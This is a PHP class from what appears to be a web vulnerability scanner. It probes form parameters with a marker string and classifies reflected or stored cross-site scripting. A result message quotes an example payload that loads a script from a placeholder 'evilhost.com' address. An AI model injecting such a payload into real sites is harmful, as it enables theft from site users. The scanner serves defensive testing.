<?php
class Insomnia_Workflow_Research_XSS_Inject_RemoteCode
	extends Insomnia_Workflow_Research_XSS_XSSInjectTechnique
{
	public static $techniqueName = "Remote Code";
	public static $techniqueID = 9;
	/**
	 * @var private array $researchData
	 */
	private $researchData = array (
		"originalURL"   => "",
		"actionURL"     => "",
		"paramName"     => "",
		"paramValue"    => "",
		"paramType"     => "",
		"POSTParamFlag" => "",
		"formElements"  => array () // form: array (paramName => (value => .., type => .. ).
	);


	private $remoteCodeVector = "<>:/.=";

	public function __construct(
		$originalURL,
		$actionURL,
		$paramName,
		$paramValue,
		$paramType,
		$formElements,
		$POSTParamFlag) {

		$this->researchData["originalURL"]   = $originalURL;
		$this->researchData["actionURL"]     = $actionURL;
		$this->researchData["paramName"]     = $paramName;
		$this->researchData["paramValue"]    = $paramValue;
		$this->researchData["paramType"]     = $paramType;
		$this->researchData["POSTParamFlag"] = $POSTParamFlag;
		$this->researchData["formElements"]  = $formElements;
	}

	public function execute() {

		$techniqueResults = array();

		$requestHandler = new Insomnia_Common_Request_XSSRequestHandler();

			// Infects researched param.
			$infectedParamValue = $this->remoteCodeVector;

			// Making request data for request with infected values and without.
			// INFECTED REQUEST
			$infectedRequestSet = $this->buildInfectedRequestSet($infectedParamValue);

			// CLEAR REQUEST
			$clearRequestSet = Insomnia_Common_Request_Builder_XSSRequestSetBuilder::buildRequestSet($this->researchData["originalURL"]);

			// Doing Infected request, then the Original request and saving reply.
			// INFECTED REQUEST
			$requestHandler->setRequestSet($infectedRequestSet);
			$infectedReplySet = $requestHandler->executeProcess();

			// CLEAR REQUEST
			$requestHandler->setRequestSet($clearRequestSet);
			$clearReplySet = $requestHandler->executeProcess();

			// Checking for XSS Facts.
			// checking of infected reply.
			$infectedReplyXSSVulnerable = $this->checkForXSSFacts(
				$infectedReplySet->getBody(), $this->remoteCodeVector);
			// checking of original reply.
			$originalReplyXSSVulnerable = $this->checkForXSSFacts(
				$clearReplySet->getBody(), $this->remoteCodeVector);

			// Checking for Vulnerable. If true -> vulnerability exists. Then - not.
			if($infectedReplyXSSVulnerable || $originalReplyXSSVulnerable) {

				// Registering standart XSS Type.
				$XSSType = Insomnia_Workflow_Research_XSS_XSSCheckTechnique::XSS_UNKNOWN;

				// Making non infected request/
				$nonInfectedRequestSet = $this->buildNonInfectedRequestSet();

				// Saving reply sets for check on XSS type.

				$requestHandler->setRequestSet($clearRequestSet);
				$clearReplySet = $requestHandler->executeProcess();

				$requestHandler->setRequestSet($nonInfectedRequestSet);
				$nonInfectedReplySet = $requestHandler->executeProcess();

				// Checks type of XSS Vulnerability.
				$XSSType = ( $this->checkForXSSFacts($clearReplySet->getBody(), $this->remoteCodeVector) )
					? Insomnia_Workflow_Research_XSS_XSSCheckTechnique::XSS_STORED
					: Insomnia_Workflow_Research_XSS_XSSCheckTechnique::XSS_UNKNOWN;

				if($XSSType === Insomnia_Workflow_Research_XSS_XSSCheckTechnique::XSS_UNKNOWN) {
					$XSSType = ( $this->checkForXSSFacts($nonInfectedReplySet->getBody(), $this->remoteCodeVector) )
						? Insomnia_Workflow_Research_XSS_XSSCheckTechnique::XSS_STORED
						: Insomnia_Workflow_Research_XSS_XSSCheckTechnique::XSS_REFLECTED;
				}

				// Saving current result.
				$techniqueResults[] = new Insomnia_Common_Data_XSSInjectTechResult(
					self::$techniqueID,
					$infectedParamValue,
					$infectedReplySet,
					true,
					$XSSType,
					array( $this->remoteCodeVector ),
					'Possibly can insert the <script> tag with source attribute that will contains an URL to the evil script. Example: <script src=http://evilhost.com/evilscript.js></script>'
				);

			} else {
				$techniqueResults[] = new Insomnia_Common_Data_XSSInjectTechResult(
					self::$techniqueID,
					$infectedParamValue,
					$infectedReplySet,
					false,
					Insomnia_Workflow_Research_XSS_XSSCHeckTechnique::XSS_UNKNOWN
				);
			}

		return $techniqueResults;
	}

	// Тут можно почекать и на HTTP REQUEST CODE, и на всю байду. но пока заглушимся простым просмотром на XSS.
	private function checkForXSSFacts($htmlBody, $fact) {
		$XSSExists = false;

		//foreach($facts as $fact) {
			if(strpos($htmlBody, $fact) !== false)
				$XSSExists = true;
		//}

		return $XSSExists;
	}

	/**
	 * @param string $infectedParamValue Infected value of current param.
	 * @return XSSRequestSet
	 */
	private function buildInfectedRequestSet($infectedParamValue) {
		// Request Set.
		$infectedRequestSet = null;

		// FORM url.
		$url = $this->researchData["actionURL"];

		// POST/GET Data.
		$data = array();
		foreach($this->researchData["formElements"] as $elementName => $elementData)
			$data[$elementName] = $elementData["value"];

		$data[$this->researchData["paramName"]] = $infectedParamValue;


		// if the current form using POST method of request
		if($this->researchData["POSTParamFlag"]) { // make POST request
			$infectedRequestSet = Insomnia_Common_Request_Builder_XSSRequestSetBuilder::buildRequestSet(
				$url,
				null,
				true,
				$data
			);
		} else { // or make GET request
			$infectedRequestSet = Insomnia_Common_Request_Builder_XSSRequestSetBuilder::buildRequestSet(
				$url,
				$data
			);
		}

		return $infectedRequestSet;
	}

	/**
	 * @return XSSRequestSet
	 */
	private function buildNonInfectedRequestSet() {
		// Request Set.
		$nonInfectedRequestSet = null;

		// FORM url.
		$url = $this->researchData["actionURL"];

		// Formirating GEt/POST Data for Request in useful form.
		$data = array();
		foreach($this->researchData["formElements"] as $elementName => $elementData)
			$data[$elementName] = $elementData["value"];

		// Making Request POST or GET request
		if($this->researchData["POSTParamFlag"]) {
			// POST Request (if the POSTParamFlag is true)
			$nonInfectedRequestSet = Insomnia_Common_Request_Builder_XSSRequestSetBuilder::buildRequestSet(
				$url,
				null,
				true,
				$data
			);		
		} else {
			// GET Request (if the POSTParamFlag is false)
			$nonInfectedRequestSet = Insomnia_Common_Request_Builder_XSSRequestSetBuilder::buildRequestSet(
				$url,
				$data
			);
		}
		
		return $nonInfectedRequestSet;
	}
	
}